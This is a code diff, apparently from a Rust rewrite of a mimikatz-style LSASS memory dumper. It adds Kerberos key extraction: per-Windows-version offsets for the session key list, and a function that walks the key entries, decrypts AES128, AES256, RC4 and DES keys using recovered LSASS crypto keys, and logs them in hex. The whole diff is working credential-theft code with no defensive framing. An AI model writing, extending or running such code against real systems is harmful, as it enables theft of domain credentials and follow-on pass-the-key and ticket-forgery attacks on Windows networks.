@@ -1,7 +1,7 @@
 use crate::error::Result;
 use crate::lsass::crypto::CryptoKeys;
 use crate::lsass::patterns;
-use crate::lsass::types::{KerberosCredential, KerberosTicket, KerberosTicketType};
+use crate::lsass::types::{KerberosCredential, KerberosKey, KerberosTicket, KerberosTicketType};
 use crate::memory::VirtualMemory;
 use crate::pe::parser::PeHeaders;
 
@@ -15,6 +15,8 @@ struct KerbOffsets {
     credentials_ptr: u64,
     /// Password offset within KIWI_KERBEROS_PRIMARY_CREDENTIAL
     cred_password: u64,
+    /// Pointer to KIWI_KERBEROS_KEYS_LIST_6 (AES/DES keys)
+    key_list_ptr: u64,
     /// Offsets to ticket linked lists (LIST_ENTRY) within session entry.
     /// Each list: Flink/Blink (16 bytes). Flink points to the next
     /// KIWI_KERBEROS_INTERNAL_TICKET (at its Flink field).
@@ -22,6 +24,26 @@ struct KerbOffsets {
     tickets_2: u64, // TGS
     tickets_3: u64, // Client
 }
+
+/// Kerberos key hash entry offsets per Windows version.
+struct KerbKeyEntryOffsets {
+    /// Size of each KERB_HASHPASSWORD entry
+    entry_size: u64,
+    /// Offset to KERB_HASHPASSWORD_GENERIC within the entry
+    generic_offset: u64,
+}
+
+/// Win10 1607+: KERB_HASHPASSWORD_6_1607 (0x38 bytes, generic at 0x20)
+const KEY_ENTRY_1607: KerbKeyEntryOffsets = KerbKeyEntryOffsets {
+    entry_size: 0x38,
+    generic_offset: 0x20,
+};
+
+/// Pre-1607 (Win7/8/Win10-1507): KERB_HASHPASSWORD_6 (0x30 bytes, generic at 0x18)
+const KEY_ENTRY_PRE1607: KerbKeyEntryOffsets = KerbKeyEntryOffsets {
+    entry_size: 0x30,
+    generic_offset: 0x18,
+};
 
 /// Offsets within KIWI_KERBEROS_INTERNAL_TICKET (per version).
 #[allow(dead_code)]
@@ -52,6 +74,7 @@ const KERB_OFFSET_VARIANTS: &[KerbOffsets] = &[
         luid: 0x48,
         credentials_ptr: 0x88,
         cred_password: 0x30,
+        key_list_ptr: 0x118,
         tickets_1: 0x128,
         tickets_2: 0x140,
         tickets_3: 0x158,
@@ -62,6 +85,7 @@ const KERB_OFFSET_VARIANTS: &[KerbOffsets] = &[
         luid: 0x48,
         credentials_ptr: 0x88,
         cred_password: 0x28,
+        key_list_ptr: 0x108,
         tickets_1: 0x118,
         tickets_2: 0x130,
         tickets_3: 0x148,
@@ -72,6 +96,7 @@ const KERB_OFFSET_VARIANTS: &[KerbOffsets] = &[
         luid: 0x40,
         credentials_ptr: 0x80,
         cred_password: 0x28,
+        key_list_ptr: 0xD8,
         tickets_1: 0xE8,
         tickets_2: 0x100,
         tickets_3: 0x118,
@@ -82,6 +107,7 @@ const KERB_OFFSET_VARIANTS: &[KerbOffsets] = &[
         luid: 0x18,
         credentials_ptr: 0x50,
         cred_password: 0x28,
+        key_list_ptr: 0x90,
         tickets_1: 0xA0,
         tickets_2: 0xB8,
         tickets_3: 0xD0,
@@ -256,6 +282,13 @@ pub fn extract_kerberos_credentials(
         let password =
             extract_kerb_password(vmem, cred_ptr, offsets.cred_password, keys).unwrap_or_default();
 
+        // Extract encryption keys (AES128, AES256, RC4, DES) from pKeyList
+        let key_entry_offsets = match variant_idx {
+            0 => &KEY_ENTRY_1607,
+            _ => &KEY_ENTRY_PRE1607,
+        };
+        let kerb_keys = extract_kerb_keys(vmem, entry, offsets, key_entry_offsets, keys);
+
         // Extract tickets from all 3 lists
         let mut tickets = Vec::new();
         let ticket_lists = [
@@ -268,11 +301,12 @@ pub fn extract_kerberos_credentials(
         }
 
         log::info!(
-            "Kerberos: LUID=0x{:x} user={} domain={} password_len={} tickets={}",
+            "Kerberos: LUID=0x{:x} user={} domain={} password_len={} keys={} tickets={}",
             luid,
             username,
             domain,
             password.len(),
+            kerb_keys.len(),
             tickets.len()
         );
 
@@ -282,12 +316,109 @@ pub fn extract_kerberos_credentials(
                 username: username.clone(),
                 domain: domain.clone(),
                 password,
+                keys: kerb_keys,
                 tickets,
             },
         ));
     }
 
     Ok(results)
+}
+
+/// Extract Kerberos encryption keys (AES128, AES256, RC4, DES) from pKeyList.
+/// The pKeyList pointer in the session entry points to a KIWI_KERBEROS_KEYS_LIST_6:
+///   +0x00: unk0 (DWORD)
+///   +0x04: cbItem (DWORD) - number of key entries
+///   +0x08..+0x27: padding/unknown
+///   +0x28: array of KERB_HASHPASSWORD_6[_1607] entries
+fn extract_kerb_keys(
+    vmem: &impl VirtualMemory,
+    entry: u64,
+    offsets: &KerbOffsets,
+    key_entry_offsets: &KerbKeyEntryOffsets,
+    keys: &CryptoKeys,
+) -> Vec<KerberosKey> {
+    let key_list_ptr = match vmem.read_virt_u64(entry + offsets.key_list_ptr) {
+        Ok(p) if p > 0x10000 && (p >> 48) == 0 => p,
+        _ => return Vec::new(),
+    };
+
+    // Read key list header: cbItem at +0x04
+    let cb_item = match vmem.read_virt_u32(key_list_ptr + 0x04) {
+        Ok(n) if n > 0 && n <= 32 => n as usize,
+        _ => return Vec::new(),
+    };
+
+    let mut result = Vec::new();
+    let entries_base = key_list_ptr + 0x28; // past the KIWI_KERBEROS_KEYS_LIST_6 header
+
+    for i in 0..cb_item {
+        let entry_base = entries_base + (i as u64) * key_entry_offsets.entry_size;
+        let generic_base = entry_base + key_entry_offsets.generic_offset;
+
+        // KERB_HASHPASSWORD_GENERIC: Type (u32), pad, Size (u64), Checksump (u64)
+        let etype = match vmem.read_virt_u32(generic_base) {
+            Ok(t) => t,
+            Err(_) => continue,
+        };
+        let key_size = match vmem.read_virt_u64(generic_base + 0x08) {
+            Ok(s) if s > 0 && s <= 256 => s as usize,
+            _ => continue,
+        };
+        let checksum_ptr = match vmem.read_virt_u64(generic_base + 0x10) {
+            Ok(p) if p > 0x10000 && (p >> 48) == 0 => p,
+            _ => continue,
+        };
+
+        // Read encrypted key bytes and decrypt
+        let enc_key_data = match vmem.read_virt_bytes(checksum_ptr, key_size) {
+            Ok(d) => d,
+            Err(_) => continue,
+        };
+        let decrypted = match crate::lsass::crypto::decrypt_credential(keys, &enc_key_data) {
+            Ok(d) => d,
+            Err(_) => continue,
+        };
+
+        // Validate key size matches expected for this etype
+        let expected_len = match etype {
+            17 => 16, // AES128
+            18 => 32, // AES256
+            23 => 16, // RC4/NTLM
+            3 | 1 => 8, // DES
+            _ => decrypted.len(),
+        };
+        if decrypted.len() < expected_len {
+            continue;
+        }
+        let key_bytes = decrypted[..expected_len].to_vec();
+
+        // Skip all-zero keys
+        if key_bytes.iter().all(|&b| b == 0) {
+            continue;
+        }
+
+        log::debug!(
+            "  Kerberos key: etype={} ({}) size={} key={}",
+            etype,
+            match etype {
+                17 => "AES128",
+                18 => "AES256",
+                23 => "RC4",
+                3 => "DES",
+                _ => "?",
+            },
+            key_bytes.len(),
+            hex::encode(&key_bytes)
+        );
+
+        result.push(KerberosKey {
+            etype,
+            key: key_bytes,
+        });
+    }
+
+    result
 }
 
 /// Walk a doubly-linked ticket list and extract each ticket.
